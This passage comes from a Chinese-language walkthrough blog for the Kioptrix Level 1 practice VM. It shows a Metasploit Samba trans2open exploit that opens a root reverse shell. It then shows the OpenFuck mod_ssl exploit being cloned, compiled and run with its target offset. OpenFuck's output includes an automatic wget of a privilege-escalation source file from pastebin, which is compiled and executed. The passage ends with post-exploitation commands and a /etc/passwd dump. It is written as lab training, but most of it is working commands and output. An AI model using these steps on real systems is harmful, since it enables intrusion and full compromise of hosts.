  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[-] 192.168.19.140:139 - **Exploit failed: undefined method `each_module**<span class="string">&#x27; for [[&quot;x86/single_byte&quot;, Msf::Modules::Nop__X86__Single_byte::MetasploitModule], [&quot;x86/opty2&quot;, Msf::Modules::Nop__X86__Opty2::MetasploitModule]]:Array</span></span><br><span class="line"><span class="string">Did you mean?  each_slice</span></span><br><span class="line"><span class="string">[*] Exploit completed, but no session was created.</span></span><br></pre></td></tr></table></figure>
<p>  這樣的錯誤問題有可能是源碼中使用each_module，但我在查看該rb檔案後沒發現有這行</p>
<p>  <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/pull/18828/files">https://github.com/rapid7/metasploit-framework/pull/18828/files</a></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(X) nops.each_module &#123; |nopname, nopmod|</span><br><span class="line">(O) nops.each &#123; |nopname, nopmod|</span><br></pre></td></tr></table></figure>
<p>  後來決定更新看看msf</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **apt update; apt install metasploit-framework**</span><br></pre></td></tr></table></figure>
<p>  再次重開啟會看到msf沒報錯了</p>
</li>
</ul>
<p>但從運行結果看到 <code>Meterpreter session X closed.  Reason: Died</code> </p>
<p>這有可能是Payload的問題，可以換一個試試</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(linux/samba/trans2open) &gt; **options** </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/trans2open):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS  192.168.19.140   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using</span><br><span class="line">                                      -metasploit.html</span><br><span class="line">   RPORT   139              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Payload options (linux/x86/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Samba 2.2.x - Bruteforce</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; **<span class="built_in">set</span> payload** </span><br><span class="line"><span class="built_in">set</span> payload generic/custom                            <span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload generic/debug_trap                        <span class="built_in">set</span> payload linux/x86/metsvc_bind_tcp</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_bind_aws_ssm                <span class="built_in">set</span> payload linux/x86/metsvc_reverse_tcp</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_bind_tcp                    <span class="built_in">set</span> payload linux/x86/read_file</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_reverse_tcp                 <span class="built_in">set</span> payload linux/x86/shell/bind_ipv6_tcp</span><br><span class="line"><span class="built_in">set</span> payload generic/ssh/interact                      <span class="built_in">set</span> payload linux/x86/shell/bind_ipv6_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload generic/tight_loop                        <span class="built_in">set</span> payload linux/x86/shell/bind_nonx_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/adduser                         <span class="built_in">set</span> payload linux/x86/shell/bind_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/chmod                           <span class="built_in">set</span> payload linux/x86/shell/bind_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/exec                            <span class="built_in">set</span> payload linux/x86/shell/reverse_ipv6_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_ipv6_tcp       <span class="built_in">set</span> payload linux/x86/shell/reverse_nonx_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_ipv6_tcp_uuid  <span class="built_in">set</span> payload linux/x86/shell/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_nonx_tcp       <span class="built_in">set</span> payload linux/x86/shell/reverse_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_tcp            <span class="built_in">set</span> payload linux/x86/shell_bind_ipv6_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_tcp_uuid       <span class="built_in">set</span> payload linux/x86/shell_bind_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_ipv6_tcp    <span class="built_in">set</span> payload linux/x86/shell_bind_tcp_random_port</span><br><span class="line">**<span class="built_in">set</span> payload linux/x86/meterpreter/reverse_nonx_tcp    <span class="built_in">set</span> payload linux/x86/shell_reverse_tcp**</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp         <span class="built_in">set</span> payload linux/x86/shell_reverse_tcp_ipv6</span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; **<span class="built_in">set</span> payload linux/x86/shell_reverse_tcp**</span><br><span class="line">payload =&gt; linux/x86/shell_reverse_tcp</span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; **options**</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/trans2open):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS  192.168.19.140   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using</span><br><span class="line">                                      -metasploit.html</span><br><span class="line">   RPORT   139              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line"></span><br><span class="line">**Payload options (linux/x86/shell_reverse_tcp):**</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   CMD    /bin/sh          <span class="built_in">yes</span>       The <span class="built_in">command</span> string to execute</span><br><span class="line">   LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Samba 2.2.x - Bruteforce</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br></pre></td></tr></table></figure>
<p>確認更換好payload後執行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(linux/samba/trans2open) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.19.130:4444 </span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffdfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffcfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffbfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffafc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff9fc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff8fc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff7fc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff6fc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff5fc...</span><br><span class="line">[*] Command shell session 9 opened (192.168.19.130:4444 -&gt; 192.168.19.140:32777) at 2024-02-14 14:59:48 -0500</span><br><span class="line"></span><br><span class="line">[*] Command shell session 10 opened (192.168.19.130:4444 -&gt; 192.168.19.140:32778) at 2024-02-14 14:59:49 -0500</span><br><span class="line">[*] Command shell session 11 opened (192.168.19.130:4444 -&gt; 192.168.19.140:32779) at 2024-02-14 14:59:50 -0500</span><br><span class="line">[*] Command shell session 12 opened (192.168.19.130:4444 -&gt; 192.168.19.140:32780) at 2024-02-14 14:59:51 -0500</span><br><span class="line"></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">hostname</span><br><span class="line">kioptrix.level1</span><br><span class="line"><span class="built_in">cat</span> /proc/version</span><br><span class="line">**Linux version 2.4.7-10** (bhcompile@stripples.devel.redhat.com) (gcc version 2.96 20000731 (Red Hat Linux 7.1 2.96-98)) <span class="comment">#1 Thu Sep 6 16:46:36 EDT 2001</span></span><br></pre></td></tr></table></figure>
<p>成功利用版本漏洞進行RCE，同時知道了目標系統是Red Hat Linux 7.1 2.96-98</p>
<p>查看linux版本方法</p>
<ul>
<li>lsb_release -a</li>
<li>cat /etc/issue</li>
<li>cat /proc/version</li>
</ul>
<h3 id="Manual-Exploitation"><a href="#Manual-Exploitation" class="headerlink" title="Manual Exploitation"></a><strong>Manual Exploitation</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">+** Red Hat Linux 7.1 2.96-98</span><br></pre></td></tr></table></figure>
<p>根據前面找到的資訊進一步利用</p>
<p>apache mod_ssl 該版本有可利用的漏洞，下載OpenFuck進行利用，根據版本選擇OffSet</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt]</span><br><span class="line">└─# git <span class="built_in">clone</span> https://github.com/heltonWernik/OpenFuck.git</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt]</span><br><span class="line">└─# <span class="built_in">cd</span> OpenFuck </span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# <span class="built_in">ls</span></span><br><span class="line">OpenFuck.c  README.md</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# apt-get install libssl-dev</span><br><span class="line"></span><br><span class="line">                                                                                                                      </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# gcc -o OpenFuck OpenFuck.c -lcrypto</span><br><span class="line"></span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# <span class="built_in">ls</span></span><br><span class="line">OpenFuck  OpenFuck.c  README.md</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# ./OpenFuck</span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</span><br><span class="line">*******************************************************************</span><br><span class="line">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br><span class="line">* <span class="comment">#hackarena  irc.brasnet.org                                     *</span></span><br><span class="line">* TNX Xanthic USG <span class="comment">#SilverLords #BloodBR #isotk #highsecure #uname *</span></span><br><span class="line">* <span class="comment">#ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span></span><br><span class="line">* <span class="comment">#pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span></span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">: Usage: ./OpenFuck target box [port] [-c N]</span><br><span class="line"></span><br><span class="line">  target - supported box eg: 0x00</span><br><span class="line">  box - hostname or IP address</span><br><span class="line">  port - port <span class="keyword">for</span> ssl connection</span><br><span class="line">  -c open N connections. (use range 40-50 <span class="keyword">if</span> u dont know)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  Supported OffSet:</span><br><span class="line">        0x00 - Caldera OpenLinux (apache-1.3.26)</span><br><span class="line">        0x01 - Cobalt Sun 6.0 (apache-1.3.12)</span><br><span class="line">        0x02 - Cobalt Sun 6.0 (apache-1.3.20)</span><br><span class="line">        0x03 - Cobalt Sun x (apache-1.3.26)</span><br><span class="line">        0x04 - Cobalt Sun x Fixed2 (apache-1.3.26)</span><br><span class="line">        0x05 - Conectiva 4 (apache-1.3.6)</span><br><span class="line">        0x06 - Conectiva 4.1 (apache-1.3.9)</span><br><span class="line">        0x07 - Conectiva 6 (apache-1.3.14)</span><br><span class="line">        0x08 - Conectiva 7 (apache-1.3.12)</span><br><span class="line">        0x09 - Conectiva 7 (apache-1.3.19)</span><br><span class="line">        0x0a - Conectiva 7/8 (apache-1.3.26)</span><br><span class="line">        0x0b - Conectiva 8 (apache-1.3.22)</span><br><span class="line">        0x0c - Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1)</span><br><span class="line">        0x0d - Debian GNU Linux (apache_1.3.19-1)</span><br><span class="line">        0x0e - Debian GNU Linux (apache_1.3.22-2)</span><br><span class="line">        0x0f - Debian GNU Linux (apache-1.3.22-2.1)</span><br><span class="line">        0x10 - Debian GNU Linux (apache-1.3.22-5)</span><br><span class="line">        0x11 - Debian GNU Linux (apache_1.3.23-1)</span><br><span class="line">        0x12 - Debian GNU Linux (apache_1.3.24-2.1)</span><br><span class="line">        0x13 - Debian Linux GNU Linux 2 (apache_1.3.24-2.1)</span><br><span class="line">        0x14 - Debian GNU Linux (apache_1.3.24-3)</span><br><span class="line">        0x15 - Debian GNU Linux (apache-1.3.26-1)</span><br><span class="line">        0x16 - Debian GNU Linux 3.0 Woody (apache-1.3.26-1)</span><br><span class="line">        0x17 - Debian GNU Linux (apache-1.3.27)</span><br><span class="line">        0x18 - FreeBSD (apache-1.3.9)</span><br><span class="line">        0x19 - FreeBSD (apache-1.3.11)</span><br><span class="line">        0x1a - FreeBSD (apache-1.3.12.1.40)</span><br><span class="line">        0x1b - FreeBSD (apache-1.3.12.1.40)</span><br><span class="line">        0x1c - FreeBSD (apache-1.3.12.1.40)</span><br><span class="line">        0x1d - FreeBSD (apache-1.3.12.1.40_1)</span><br><span class="line">        0x1e - FreeBSD (apache-1.3.12)</span><br><span class="line">        0x1f - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x20 - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x21 - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x22 - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x23 - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x24 - FreeBSD (apache-1.3.17_1)</span><br><span class="line">        0x25 - FreeBSD (apache-1.3.19)</span><br><span class="line">        0x26 - FreeBSD (apache-1.3.19_1)</span><br><span class="line">        0x27 - FreeBSD (apache-1.3.20)</span><br><span class="line">        0x28 - FreeBSD (apache-1.3.20)</span><br><span class="line">        0x29 - FreeBSD (apache-1.3.20+2.8.4)</span><br><span class="line">        0x2a - FreeBSD (apache-1.3.20_1)</span><br><span class="line">        0x2b - FreeBSD (apache-1.3.22)</span><br><span class="line">        0x2c - FreeBSD (apache-1.3.22_7)</span><br><span class="line">        0x2d - FreeBSD (apache_fp-1.3.23)</span><br><span class="line">        0x2e - FreeBSD (apache-1.3.24_7)</span><br><span class="line">        0x2f - FreeBSD (apache-1.3.24+2.8.8)</span><br><span class="line">        0x30 - FreeBSD 4.6.2-Release-p6 (apache-1.3.26)</span><br><span class="line">        0x31 - FreeBSD 4.6-Realease (apache-1.3.26)</span><br><span class="line">        0x32 - FreeBSD (apache-1.3.27)</span><br><span class="line">        0x33 - Gentoo Linux (apache-1.3.24-r2)</span><br><span class="line">        0x34 - Linux Generic (apache-1.3.14)</span><br><span class="line">        0x35 - Mandrake Linux X.x (apache-1.3.22-10.1mdk)</span><br><span class="line">        0x36 - Mandrake Linux 7.1 (apache-1.3.14-2)</span><br><span class="line">        0x37 - Mandrake Linux 7.1 (apache-1.3.22-1.4mdk)</span><br><span class="line">        0x38 - Mandrake Linux 7.2 (apache-1.3.14-2mdk)</span><br><span class="line">        0x39 - Mandrake Linux 7.2 (apache-1.3.14) 2</span><br><span class="line">        0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)</span><br><span class="line">        0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)</span><br><span class="line">        0x3c - Mandrake Linux 7.2 (apache-1.3.22-1.3mdk)</span><br><span class="line">        0x3d - Mandrake Linux 7.2 (apache-1.3.22-10.2mdk)</span><br><span class="line">        0x3e - Mandrake Linux 8.0 (apache-1.3.19-3)</span><br><span class="line">        0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)</span><br><span class="line">        0x40 - Mandrake Linux 8.2 (apache-1.3.23-4)</span><br><span class="line">        0x41 - Mandrake Linux 8.2 <span class="comment">#2 (apache-1.3.23-4)</span></span><br><span class="line">        0x42 - Mandrake Linux 8.2 (apache-1.3.24)</span><br><span class="line">        0x43 - Mandrake Linux 9 (apache-1.3.26)</span><br><span class="line">        0x44 - RedHat Linux ?.? GENERIC (apache-1.3.12-1)</span><br><span class="line">        0x45 - RedHat Linux TEST1 (apache-1.3.12-1)</span><br><span class="line">        0x46 - RedHat Linux TEST2 (apache-1.3.12-1)</span><br><span class="line">        0x47 - RedHat Linux GENERIC (marumbi) (apache-1.2.6-5)</span><br><span class="line">        0x48 - RedHat Linux 4.2 (apache-1.1.3-3)</span><br><span class="line">        0x49 - RedHat Linux 5.0 (apache-1.2.4-4)</span><br><span class="line">        0x4a - RedHat Linux 5.1-Update (apache-1.2.6)</span><br><span class="line">        0x4b - RedHat Linux 5.1 (apache-1.2.6-4)</span><br><span class="line">        0x4c - RedHat Linux 5.2 (apache-1.3.3-1)</span><br><span class="line">        0x4d - RedHat Linux 5.2-Update (apache-1.3.14-2.5.x)</span><br><span class="line">        0x4e - RedHat Linux 6.0 (apache-1.3.6-7)</span><br><span class="line">        0x4f - RedHat Linux 6.0 (apache-1.3.6-7)</span><br><span class="line">        0x50 - RedHat Linux 6.0-Update (apache-1.3.14-2.6.2)</span><br><span class="line">        0x51 - RedHat Linux 6.0 Update (apache-1.3.24)</span><br><span class="line">        0x52 - RedHat Linux 6.1 (apache-1.3.9-4)1</span><br><span class="line">        0x53 - RedHat Linux 6.1 (apache-1.3.9-4)2</span><br><span class="line">        0x54 - RedHat Linux 6.1-Update (apache-1.3.14-2.6.2)</span><br><span class="line">        0x55 - RedHat Linux 6.1-fp2000 (apache-1.3.26)</span><br><span class="line">        0x56 - RedHat Linux 6.2 (apache-1.3.12-2)1</span><br><span class="line">        0x57 - RedHat Linux 6.2 (apache-1.3.12-2)2</span><br><span class="line">        0x58 - RedHat Linux 6.2 mod(apache-1.3.12-2)3</span><br><span class="line">        0x59 - RedHat Linux 6.2 update (apache-1.3.22-5.6)1</span><br><span class="line">        0x5a - RedHat Linux 6.2-Update (apache-1.3.22-5.6)2</span><br><span class="line">        0x5b - Redhat Linux 7.x (apache-1.3.22)</span><br><span class="line">        0x5c - RedHat Linux 7.x (apache-1.3.26-1)</span><br><span class="line">        0x5d - RedHat Linux 7.x (apache-1.3.27)</span><br><span class="line">        0x5e - RedHat Linux 7.0 (apache-1.3.12-25)1</span><br><span class="line">        0x5f - RedHat Linux 7.0 (apache-1.3.12-25)2</span><br><span class="line">        0x60 - RedHat Linux 7.0 (apache-1.3.14-2)</span><br><span class="line">        0x61 - RedHat Linux 7.0-Update (apache-1.3.22-5.7.1)</span><br><span class="line">        0x62 - RedHat Linux 7.0-7.1 update (apache-1.3.22-5.7.1)</span><br><span class="line">        0x63 - RedHat Linux 7.0-Update (apache-1.3.27-1.7.1)</span><br><span class="line">        0x64 - RedHat Linux 7.1 (apache-1.3.19-5)1</span><br><span class="line">        0x65 - RedHat Linux 7.1 (apache-1.3.19-5)2</span><br><span class="line">        0x66 - RedHat Linux 7.1-7.0 update (apache-1.3.22-5.7.1)</span><br><span class="line">        0x67 - RedHat Linux 7.1-Update (1.3.22-5.7.1)</span><br><span class="line">        0x68 - RedHat Linux 7.1 (apache-1.3.22-src)</span><br><span class="line">        0x69 - RedHat Linux 7.1-Update (1.3.27-1.7.1)</span><br><span class="line">        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1</span><br><span class="line">        **0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2**</span><br><span class="line">        0x6c - RedHat Linux 7.2-Update (apache-1.3.22-6)</span><br><span class="line">        0x6d - RedHat Linux 7.2 (apache-1.3.24)</span><br><span class="line">        0x6e - RedHat Linux 7.2 (apache-1.3.26)</span><br><span class="line">        0x6f - RedHat Linux 7.2 (apache-1.3.26-snc)</span><br><span class="line">        0x70 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)1</span><br><span class="line">        0x71 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)2</span><br><span class="line">        0x72 - RedHat Linux 7.2-Update (apache-1.3.27-1.7.2)</span><br><span class="line">        0x73 - RedHat Linux 7.3 (apache-1.3.23-11)1</span><br><span class="line">        0x74 - RedHat Linux 7.3 (apache-1.3.23-11)2</span><br><span class="line">        0x75 - RedHat Linux 7.3 (apache-1.3.27)</span><br><span class="line">        0x76 - RedHat Linux 8.0 (apache-1.3.27)</span><br><span class="line">        0x77 - RedHat Linux 8.0-second (apache-1.3.27)</span><br><span class="line">        0x78 - RedHat Linux 8.0 (apache-2.0.40)</span><br><span class="line">        0x79 - Slackware Linux 4.0 (apache-1.3.6)</span><br><span class="line">        0x7a - Slackware Linux 7.0 (apache-1.3.9)</span><br><span class="line">        0x7b - Slackware Linux 7.0 (apache-1.3.26)</span><br><span class="line">        0x7c - Slackware 7.0  (apache-1.3.26)2</span><br><span class="line">        0x7d - Slackware Linux 7.1 (apache-1.3.12)</span><br><span class="line">        0x7e - Slackware Linux 8.0 (apache-1.3.20)</span><br><span class="line">        0x7f - Slackware Linux 8.1 (apache-1.3.24)</span><br><span class="line">        0x80 - Slackware Linux 8.1 (apache-1.3.26)</span><br><span class="line">        0x81 - Slackware Linux 8.1-stable (apache-1.3.26)</span><br><span class="line">        0x82 - Slackware Linux (apache-1.3.27)</span><br><span class="line">        0x83 - SuSE Linux 7.0 (apache-1.3.12)</span><br><span class="line">        0x84 - SuSE Linux 7.1 (apache-1.3.17)</span><br><span class="line">        0x85 - SuSE Linux 7.2 (apache-1.3.19)</span><br><span class="line">        0x86 - SuSE Linux 7.3 (apache-1.3.20)</span><br><span class="line">        0x87 - SuSE Linux 8.0 (apache-1.3.23)</span><br><span class="line">        0x88 - SUSE Linux 8.0 (apache-1.3.23-120)</span><br><span class="line">        0x89 - SuSE Linux 8.0 (apache-1.3.23-137)</span><br><span class="line">        0x8a - Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)</span><br><span class="line"></span><br><span class="line">Fuck to all guys <span class="built_in">who</span> like use lamah ddos. Read SRC to have no surprise</span><br></pre></td></tr></table></figure>
<ul>
<li>找到了符合版本可以進行利用的offset</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# ./OpenFuck 0x6b 192.168.19.140 -c 40     </span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</span><br><span class="line">*******************************************************************</span><br><span class="line">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br><span class="line">* <span class="comment">#hackarena  irc.brasnet.org                                     *</span></span><br><span class="line">* TNX Xanthic USG <span class="comment">#SilverLords #BloodBR #isotk #highsecure #uname *</span></span><br><span class="line">* <span class="comment">#ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span></span><br><span class="line">* <span class="comment">#pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span></span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">Connection... 40 of 40</span><br><span class="line">Establishing SSL connection</span><br><span class="line">cipher: 0x4043808c   ciphers: 0x80f80e0</span><br><span class="line">Ready to send shellcode</span><br><span class="line">Spawning shell...</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">bash-2.05$ </span><br><span class="line">race-kmod.c; gcc -o p ptrace-kmod.c; <span class="built_in">rm</span> ptrace-kmod.c; ./p; m/raw/C7v25Xr9 -O pt </span><br><span class="line">--04:46:23--  https://pastebin.com/raw/C7v25Xr9</span><br><span class="line">           =&gt; `ptrace-kmod.c<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Connecting to pastebin.com:443... connected!</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: unspecified [text/plain]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    0K ...                                                    @   3.84 MB/s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">04:46:24 (3.84 MB/s) - `ptrace-kmod.c&#x27;</span> saved [4026]</span><br><span class="line"></span><br><span class="line">ptrace-kmod.c:183:1: warning: no newline at end of file</span><br><span class="line">[+] Attached to 6630</span><br><span class="line">[+] Waiting <span class="keyword">for</span> signal</span><br><span class="line">[+] Signal caught</span><br><span class="line">[+] Shellcode placed at 0x4001189d</span><br><span class="line">[+] Now <span class="built_in">wait</span> <span class="keyword">for</span> suid shell...</span><br><span class="line"></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">hostname</span><br><span class="line">kioptrix.level1</span><br><span class="line"></span><br><span class="line">locate flag</span><br><span class="line">/usr/sbin/rootflags</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_c/db_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_c/env_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_cxx/db_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_cxx/env_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_java/db_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_java/env_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/ref/build_unix/flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/ref/upgrade.3.2/set_flags.html</span><br><span class="line">/usr/share/man/man3/fegetexceptflag.3.gz</span><br><span class="line">/usr/share/man/man3/fesetexceptflag.3.gz</span><br><span class="line">/usr/share/man/man3/tgetflag.3x.gz</span><br><span class="line">/usr/share/man/man3/tigetflag.3x.gz</span><br><span class="line">/usr/share/man/man8/rootflags.8.gz</span><br><span class="line">/usr/include/bits/waitflags.h</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /usr/sbin/rootflags</span><br><span class="line">ELhP�A�q��.u�V����������P�s������jatus)Z</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">User root may run the following commands on this host:</span><br><span class="line">    (ALL) ALL</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">news:x:9:13:news:/var/spool/news:</span><br><span class="line">uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">games:x:12:100:games:/usr/games:/sbin/nologin</span><br><span class="line">gopher:x:13:30:gopher:/var/gopher:/sbin/nologin</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">nobody:x:99:99:Nobody:/:/sbin/nologin</span><br><span class="line">mailnull:x:47:47::/var/spool/mqueue:/dev/null</span><br><span class="line">rpm:x:37:37::/var/lib/rpm:/bin/bash</span><br><span class="line">xfs:x:43:43:X Font Server:/etc/X11/fs:/bin/false</span><br><span class="line">rpc:x:32:32:Portmapper RPC user:/:/bin/false</span><br><span class="line">rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin</span><br><span class="line">nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin</span><br><span class="line">nscd:x:28:28:NSCD Daemon:/:/bin/false</span><br><span class="line">ident:x:98:98:pident user:/:/sbin/nolcat /etc/passwd</span><br><span class="line">ogin</span><br><span class="line">radvd:x:75:75:radvd user:/:/bin/false</span><br><span class="line">postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash</span><br><span class="line">apache:x:48:48:Apache:/var/www:/bin/false</span><br><span class="line">squid:x:23:23::/var/spool/squid:/dev/null</span><br><span class="line">pcap:x:77:77::/var/arpwatch:/bin/nologin</span><br><span class="line">john:x:500:500::/home/john:/bin/bash</span><br><span 